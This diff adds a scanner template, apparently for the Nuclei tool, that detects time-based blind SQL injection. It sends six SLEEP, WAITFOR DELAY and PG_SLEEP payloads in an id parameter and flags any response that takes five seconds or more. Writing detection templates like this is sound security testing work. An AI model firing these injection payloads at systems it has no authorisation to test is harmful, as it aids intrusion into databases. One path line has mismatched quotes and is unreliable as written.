@@ -1,0 +1,22 @@
+id: m7-sqli-time-blind
+info:
+  name: M7 - Time-Based Blind SQL Injection
+  author: Sharlix
+  severity: critical
+  description: Time-based blind SQLi via SLEEP/WAITFOR DELAY payloads
+  tags: sqli,blind,time-based,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1' AND SLEEP(5)-- -"
+      - "{{BaseURL}}?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"
+      - "{{BaseURL}}?id=1; WAITFOR DELAY '0:0:5'-- -"
+      - "{{BaseURL}}?id=1' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -"
+      - "{{BaseURL}}?id=1' OR SLEEP(5)-- -"
+      - "{{BaseURL}}?id=1" AND SLEEP(5)-- -"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
